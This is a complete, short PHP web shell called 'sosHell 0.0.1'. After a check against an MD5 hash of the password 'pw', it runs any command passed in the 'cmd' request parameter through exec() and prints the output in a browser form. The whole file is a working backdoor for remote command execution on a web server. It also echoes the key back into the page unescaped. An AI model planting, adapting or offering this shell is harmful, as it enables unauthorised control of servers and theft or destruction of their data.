<?php
//Config

$sosHellKey = md5("pw"); 
$sosHellMKey= md5("pw");
$key="";
	
//Code
if(isset($_REQUEST["soskey"]))
	$key=$_REQUEST["soskey"]; 

if(md5($key)==$sosHellKey || md5($key)==$sosHellMKey){
	if(isset($_REQUEST["cmd"])){
		$cmd=$_REQUEST["cmd"];		
		//system($cmd, $sysRetVal);
		exec($cmd,$ausgabe);
		foreach($ausgabe as $line){
			echo($line."<br>");	
		}
	}else{echo("Welcome to sosHell 0.0.1");}
	
	echo("<form><div style='width:100%; position:fixed;bottom:0px; '><input name='soskey' type='hidden' value='"
			.$key."'></input><input style='width:100%;' name='cmd' type='text' autofocus></div></form>");
}
?>
